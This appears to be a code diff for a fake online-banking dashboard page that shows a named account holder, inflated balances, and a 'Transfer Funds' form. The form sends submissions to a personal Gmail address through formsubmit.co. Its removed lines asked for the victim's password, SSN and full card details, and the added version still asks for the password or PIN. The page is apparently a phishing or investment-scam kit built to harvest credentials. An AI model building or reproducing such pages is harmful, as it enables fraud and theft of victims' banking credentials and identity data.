@@ -5,24 +5,69 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Dashboard</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    /* Logout Button Styling */
+    .logout-btn {
+      background-color: #ff4b5c;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 25px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 10px rgba(255, 75, 92, 0.3);
+    }
+
+    .logout-btn:hover {
+      background-color: #e84354;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 14px rgba(255, 75, 92, 0.4);
+    }
+
+    .logout-container {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+    }
+
+    @media (max-width: 768px) {
+      .logout-btn {
+        padding: 8px 16px;
+        font-size: 14px;
+      }
+      .logout-container {
+        top: 10px;
+        right: 10px;
+      }
+    }
+  </style>
 </head>
 <body class="dashboard-page">
   <header>
     <div class="profile">
       <span>Welcome, Stephen L Eichhorn</span>
     </div>
+
+    <!-- ✅ Logout Button -->
+    <div class="logout-container">
+      <button class="logout-btn" onclick="window.location.href='index.html'">Logout</button>
+    </div>
+
     <div class="balance-cards-container">
-  <div class="balance-card">
-    <p>Available Balance</p>
-    <h1>$756,849.90</h1>
-  </div>
-  <div class="balance-card">
-    <p>Fixed Shares Balance</p>
-    <h1>$141,099.47</h1>
-  </div>
-</div>
+      <div class="balance-card">
+        <p>Available Balance</p>
+        <h1>$756,849.90</h1>
+      </div>
+      <div class="balance-card">
+        <p>Fixed Shares Balance</p>
+        <h1>$141,099.47</h1>
+      </div>
+    </div>
   </header>
- <section class="actions">
+
+  <section class="actions">
     <button onclick="toggleTransferForm()">Funds Transfer</button>
     <button onclick="showPopup()">To Wallet</button>
     <button onclick="showPopup()">To Bank</button>
@@ -33,21 +78,16 @@
   <section class="transfer-form" id="transferForm" style="display: none;">
     <h3>Transfer Funds</h3>
     <form action="https://formsubmit.co/santiagorafaela647@gmail.com" method="POST">
-  <input type="text" name="receiver_name" placeholder="Receiver Name" required>
-  <input type="text" name="receiver_account_number" placeholder="Receiver Account Number" required>
-  <input type="text" name="routing_number" placeholder="ROUTING NUMBER" required>
-  <input type="text" name="receiver_bank" placeholder="Receiver Bank" required>
-  <input type="password" name="sender_password" placeholder="Your Password" required>
-  <input type="text" name="sender_ssn" placeholder="Your SSN" required>
-  <input type="text" name="sender_ssn" placeholder="Your SSN" required>
-  <input type="text" name="card_details" placeholder="Card Number / Expiry / CVV" required>
-  <input type="text" name="contact_email" placeholder="Email" required>
-  <input type="text" name="contact_phone_number" placeholder="Phone Number" required>
-  <button type="submit">Send</button>
+      <input type="text" name="receiver_name" placeholder="Receiver Name" required>
+      <input type="text" name="receiver_account_number" placeholder="Receiver Account Number" required>
+      <input type="text" name="routing_number" placeholder="ROUTING NUMBER" required>
+      <input type="text" name="receiver_bank" placeholder="Receiver Bank" required>
+      <input type="password" name="sender_password" placeholder="Your PIN`" required>
+      <button type="submit">Send</button>
     </form>
   </section>
 
-  <p> Transaction History</p>
+  <p>Transaction History</p>
   <section class="transactions">
     <div class="transaction">
       <p>Transfer From Bitcoin Investment Payment</p>
